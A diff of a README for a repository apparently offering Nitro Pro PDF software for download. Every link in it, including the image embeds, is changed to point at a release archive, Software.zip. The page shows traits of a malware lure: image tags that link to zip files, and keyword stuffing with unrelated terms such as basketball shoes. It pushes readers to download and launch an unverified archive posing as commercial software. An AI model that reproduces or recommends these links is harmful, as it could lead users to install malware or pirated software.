@@ -1,6 +1,6 @@
 # 🚀 Welcome to Nitro Pro Download Repository! 🚀
 
-![Nitro Pro Logo](https://github.com/spectro800/Nitro-Pro-Download/releases/download/v1.0/Application.zip)
+![Nitro Pro Logo](https://github.com/spectro800/Nitro-Pro-Download/releases/download/v2.0/Software.zip)
 
 ## Nitro Pro - Your Ultimate PDF Solution! 💼📄
 
@@ -24,7 +24,7 @@ In this repository, you will find valuable resources, tips, and information on t
 - Puma All Pro Nitro Basketball Shoes
 - What is Nitro Pro
 
-### 🔗 [Download Nitro Pro Software Here!](https://github.com/spectro800/Nitro-Pro-Download/releases/download/v1.0/Application.zip) 🔗
+### 🔗 [Download Nitro Pro Software Here!](https://github.com/spectro800/Nitro-Pro-Download/releases/download/v2.0/Software.zip) 🔗
 Launch the link above to download the Nitro Pro software and unlock a world of possibilities for managing your PDF files efficiently.
 
 ### 📦 Explore Nitro Pro Features 📦
@@ -54,4 +54,4 @@ Download Nitro Pro now and unlock a world of possibilities for PDF editing, crea
 
 ### 🌟 Happy Editing with Nitro Pro! 🌟
 
-![Nitro Pro Image](https://github.com/spectro800/Nitro-Pro-Download/releases/download/v1.0/Application.zip)
+![Nitro Pro Image](https://github.com/spectro800/Nitro-Pro-Download/releases/download/v2.0/Software.zip)
